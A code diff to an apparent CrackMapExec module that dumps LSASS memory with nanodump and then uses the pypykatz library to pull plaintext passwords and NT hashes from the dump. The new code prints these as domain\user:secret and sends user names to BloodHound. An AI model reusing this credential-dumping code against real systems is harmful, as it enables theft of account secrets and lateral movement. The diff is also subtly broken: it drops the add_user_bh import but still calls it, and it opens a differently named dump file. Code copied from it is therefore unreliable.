@@ -2,14 +2,9 @@
 # author of the module : github.com/mpgn
 # nanodump: https://github.com/helpsystems/nanodump
 
-import os
-import sys
-import re
+from io import StringIO
 import base64
-import random
-import string
-from cme.helpers.logger import highlight
-from cme.helpers.bloodhound import add_user_bh
+from pypykatz.pypykatz import pypykatz
 
 class CMEModule:
 
@@ -130,29 +125,32 @@ class CMEModule:
             fh.seek(6)
             fh.write(b'\x00\x00')
             fh.close()         
-
-            context.log.info('pypykatz lsa minidump "{}" --outfile "{}.txt"'.format(self.dir_result + nano_log_name, self.dir_result + nano_log_name))
             
-            try:
-                context.log.info('Invoke pypykatz in order to extract the credentials ...')
-                os.system('pypykatz lsa minidump "' + self.dir_result + nano_log_name + '" --outfile "' + self.dir_result + nano_log_name + '.txt" >/dev/null 2>&1')
-                context.log.info("Extracted credentials:")
-                with open(self.dir_result + nano_log_name + ".txt", 'r') as outfile:
-                    data = outfile.read()
-                    regex = r"(?:username:? (?!NA)(?P<username>.+[^\$])\n.*domain(?:name)?:? (?P<domain>.+)\n)(?:.*password:? (?!None)(?P<password>.+)|.*\n.*NT: (?P<hash>.*))"
-                    matches = re.finditer(regex, data, re.MULTILINE | re.IGNORECASE)
+            with open(self.dir_result + machine_name, 'rb') as dump:
+                try:
+                    credentials = []
                     credz_bh = []
-                    domain = ""
-                    for match in matches:
-                        domain = match.group("domain")
-                        username = match.group("username")
-                        password = match.group("password") or match.group("hash")
-                        context.log.success(highlight(domain + "\\" + username + ":" + password))
-                        if "." not in domain and domain.upper() in connection.domain.upper():
-                            domain = connection.domain
-                            credz_bh.append({'username': username.upper(), 'domain': domain.upper()})
-                    if domain:
-                        add_user_bh(credz_bh, domain, context.log, connection.config)
-            except Exception as e:
-                context.log.error('Error while executing pypykatz: {}'.format(e))
-                context.log.error('Please make sure pypykatz is installed (pip3 install pypykatz)')
+                    pypy_parse = pypykatz.parse_minidump_external(dump)
+
+                    ssps = ['msv_creds', 'wdigest_creds', 'ssp_creds', 'livessp_creds', 'kerberos_creds', 'credman_creds',
+                            'tspkg_creds']
+                    for luid in pypy_parse.logon_sessions:
+
+                        for ssp in ssps:
+                            for cred in getattr(pypy_parse.logon_sessions[luid], ssp, []):
+                                domain = getattr(cred, "domainname", None)
+                                username = getattr(cred, "username", None)
+                                password = getattr(cred, "password", None)
+                                NThash = getattr(cred, "NThash", None)
+                                if NThash is not None:
+                                    NThash = NThash.hex()
+                                if username and (password or NThash) and "$" not in username:
+                                    print_pass = password if password else NThash
+                                    context.log.highlight(domain + "\\" + username + ":" + print_pass)
+                                    if "." not in domain and domain.upper() in connection.domain.upper():
+                                        domain = connection.domain
+                                        credz_bh.append({'username': username.upper(), 'domain': domain.upper()})
+                    if len(credz_bh) > 0:
+                        add_user_bh(credz_bh, None, context.log, connection.config)
+                except Exception as e:
+                    context.log.error('Error openning dump file', str(e))
